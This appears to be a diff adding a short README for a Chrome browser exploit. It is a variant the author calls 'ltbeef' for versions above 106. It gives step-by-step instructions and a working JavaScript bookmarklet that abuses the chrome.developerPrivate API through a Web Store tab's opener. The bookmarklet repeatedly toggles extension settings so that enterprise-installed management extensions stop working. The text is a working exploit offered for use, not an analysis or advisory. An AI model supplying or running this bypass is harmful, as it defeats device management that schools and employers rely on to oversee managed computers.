@@ -1,0 +1,18 @@
+basically ltbeef for >106 but realllllly scuffed
+uses @# of human brains in my pantry🡲 's pointblank exploit. @Sharp_Jack made the initial payload
+
+Requires:
+bookmarklets
+at least 1 extension installed from the chrome web store
+
+Steps:
+go to chrome://extensions
+click any extension that's installed from the webstore, not one of the enterprise installed extensions
+scroll down and click "Open in Chrome Web Store"
+spam escape before the page loads. it should be a white screen. if it loads into the chrome webstore you have to try again
+run this bookmarklet let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);
+insert extension ids. i don't feel like explaining how to get them and really you should know by now
+
+if you close the tab the extensions come back
+
+(yes, the skid l33tspeak is 100% neccesary, trust me)
